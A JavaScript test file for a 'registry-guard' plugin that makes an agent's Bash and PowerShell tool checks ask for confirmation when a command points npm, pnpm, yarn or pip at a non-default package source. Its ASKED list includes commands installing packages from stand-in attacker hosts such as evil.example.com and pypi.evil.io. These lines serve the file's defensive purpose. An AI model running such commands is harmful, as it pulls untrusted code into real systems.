import { expect, test } from 'claude-code/testing'

const ASKED = [
  'npm config set registry https://registry.example.com/',
  'pnpm config set registry http://localhost:4873',
  'yarn config set registry https://npm.pkg.github.com',
  'npm install left-pad --registry=https://evil.example.com',
  'npm i left-pad --registry https://evil.example.com',
  'pip install requests --index-url https://pypi.evil.io/simple',
  'pip install -r requirements.txt --extra-index-url http://10.0.0.5/simple',
  'pip install -i https://mirror.example.com/simple requests',
  'pip config set global.index-url https://mirror.example.com/simple',
  'PIP_INDEX_URL=https://x.example.com/simple pip install y',
]

const PASSED = [
  'npm config set registry https://registry.npmjs.org/',
  'npm install left-pad --registry=https://registry.npmjs.org',
  'pip install requests',
  'pip install -r requirements.txt',
  'pip install --index-url https://pypi.org/simple requests',
  'npm config get registry',
  'npm install',
  'git status',
]

test('asks before a command points packages at another source, in English by default', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  for (const command of ASKED) {
    const verdict = await $.tool.check({ tool: 'Bash', input: { command } })
    expect(verdict.decision, command).toBe('ask')
    expect(verdict.reason, command).toContain('registry-guard: points packages at')
  }
})

test('lets default registries and everyday installs through', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))

  for (const command of PASSED) {
    const verdict = await $.tool.check({ tool: 'Bash', input: { command } })
    expect(verdict.decision, command).toBe('allow')
  }
})

test('asks in PowerShell too and keeps a verdict that is already a denial', async ($, on) => {
  on('tool.check', ($, e) => ({ decision: e.tool === 'PowerShell' ? 'allow' : 'deny', reason: 'beneath' }))

  const asked = await $.tool.check({
    tool: 'PowerShell',
    input: { command: 'npm config set registry https://registry.example.com/' },
  })
  expect(asked.decision).toBe('ask')

  const denied = await $.tool.check({
    tool: 'Bash',
    input: { command: 'npm config set registry https://registry.example.com/' },
  })
  expect(denied.decision).toBe('deny')
})

test('speaks the language set in the hub', async ($, on) => {
  on('tool.check', () => ({ decision: 'allow' }))
  // Stands in for the hub: answers the language it would hold.
  on('state.get', { plugin: 'cockpit', key: 'lang' }, () => ({ value: { value: 'pt', version: 1 } }))

  const verdict = await $.tool.check({
    tool: 'Bash',
    input: { command: 'npm config set registry https://registry.example.com/' },
  })
  expect(verdict.reason).toContain('registry-guard: aponta os pacotes para registry.example.com. Confirme.')
})
